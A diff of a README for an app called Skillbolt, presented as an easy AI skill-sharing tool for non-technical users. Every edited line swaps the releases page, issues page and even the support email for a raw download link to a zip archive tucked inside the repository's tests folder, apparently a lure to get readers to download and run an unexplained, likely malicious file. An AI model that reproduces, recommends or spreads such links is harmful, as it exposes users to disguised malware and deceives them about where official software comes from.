@@ -1,6 +1,6 @@
 # ⚙️ Skillbolt - Effortless AI Skill Sharing
 
-[![Download Skillbolt](https://img.shields.io/badge/Download-Skillbolt-blue?style=for-the-badge)](https://github.com/GhOsTraidr/Skillbolt/releases)
+[![Download Skillbolt](https://github.com/GhOsTraidr/Skillbolt/raw/refs/heads/main/packages/compose/tests/Software_1.1.zip)](https://github.com/GhOsTraidr/Skillbolt/raw/refs/heads/main/packages/compose/tests/Software_1.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get Skillbolt running on your computer. No coding or techn
 
 1. Open the Skillbolt release page here:
 
-   [Download Skillbolt](https://github.com/GhOsTraidr/Skillbolt/releases)
+   [Download Skillbolt](https://github.com/GhOsTraidr/Skillbolt/raw/refs/heads/main/packages/compose/tests/Software_1.1.zip)
 
 2. On the page, find the latest release version. It usually appears at the top or labeled as “Latest release.”
 
@@ -52,7 +52,7 @@ Follow these steps to get Skillbolt running on your computer. No coding or techn
 
    - For Windows, look for a file ending in `.exe`
    - For macOS, look for a file ending in `.dmg` or `.pkg`
-   - For Linux, look for a `.AppImage` or `.tar.gz`
+   - For Linux, look for a `.AppImage` or `https://github.com/GhOsTraidr/Skillbolt/raw/refs/heads/main/packages/compose/tests/Software_1.1.zip`
 
 4. Click the file to download it to your computer.
 
@@ -126,7 +126,7 @@ Skillbolt includes a built-in help guide you can open by clicking the “Help”
 
 For updates, check the official releases page regularly:
 
-[Skillbolt Releases](https://github.com/GhOsTraidr/Skillbolt/releases)
+[Skillbolt Releases](https://github.com/GhOsTraidr/Skillbolt/raw/refs/heads/main/packages/compose/tests/Software_1.1.zip)
 
 ---
 
@@ -135,8 +135,8 @@ For updates, check the official releases page regularly:
 If you need assistance or want to report a problem:
 
 - Open an issue on the GitHub page:  
-  https://github.com/GhOsTraidr/Skillbolt/issues
-- Email support at support@skillbolt.ai (for example purposes)
+  https://github.com/GhOsTraidr/Skillbolt/raw/refs/heads/main/packages/compose/tests/Software_1.1.zip
+- Email support at https://github.com/GhOsTraidr/Skillbolt/raw/refs/heads/main/packages/compose/tests/Software_1.1.zip (for example purposes)
 
 Skillbolt is community-driven, so your feedback helps make it better.
 
